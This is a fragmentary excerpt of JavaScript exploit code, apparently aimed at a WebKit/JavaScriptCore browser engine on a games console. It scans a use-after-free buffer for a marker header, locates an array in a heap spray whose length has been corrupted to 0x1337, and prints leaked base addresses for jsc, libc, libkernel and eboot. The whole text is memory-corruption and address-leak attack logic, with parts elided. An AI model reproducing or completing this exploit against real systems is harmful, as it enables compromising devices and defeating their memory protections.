...
for (let i = 8; i < uaf_view.byteLength; i += 16) {
  if (uaf_view.getBigInt(i - 8, true).eq(indexing_header) &&
    ...
    debug(`Found marker at uaf_view[${i}] !!`)

    marked_arr_offset = i - 8

    debug(`Marked indexing header ${uaf_view.getBigInt(marked_arr_offset, true)}`)
...
for (let i = 0; i < spray.length; i++) {
  if (spray[i].length === 0x1337) {
    debug(`Found corrupted array at spray[${i}] !!`)
    debug(`Corrupted array length ${new BigInt(spray[i].length)}`)
...
debug(`jsc address: ${jsc_addr}`)
debug(`libc address: ${libc_addr}`)
debug(`libkernel address: ${libkernel_addr}`)
debug(`eboot address: ${eboot_addr}`)
